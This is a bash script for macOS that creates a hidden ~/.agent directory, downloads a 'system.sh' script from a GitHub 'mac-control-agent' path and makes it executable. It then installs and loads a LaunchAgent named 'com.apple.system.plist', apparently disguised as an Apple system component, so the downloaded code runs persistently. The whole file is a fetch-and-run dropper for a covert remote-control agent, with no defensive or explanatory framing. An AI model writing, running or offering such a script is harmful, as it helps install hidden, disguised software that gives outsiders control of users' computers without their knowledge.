#!/bin/bash

AGENT_DIR="$HOME/.agent"
PLIST_NAME="com.apple.system.plist"
PLIST_PATH="$HOME/Library/LaunchAgents/$PLIST_NAME"

# Create hidden agent directory
mkdir -p "$AGENT_DIR"

# Download system.sh
curl -sL https://raw.githubusercontent.com/Dinesh-777/script/refs/heads/main/mac-control-agent/system.sh -o "$AGENT_DIR/system.sh"
chmod +x "$AGENT_DIR/system.sh"

# Download plist
curl -sL https://raw.githubusercontent.com/Dinesh-777/script/refs/heads/main/mac-control-agent/com.apple.system.plist -o "$PLIST_PATH"

# Replace /Users/$(whoami) with actual home path in plist
sed -i '' "s|/Users/\$(whoami)|$HOME|g" "$PLIST_PATH"

# Load the LaunchAgent
launchctl load "$PLIST_PATH"
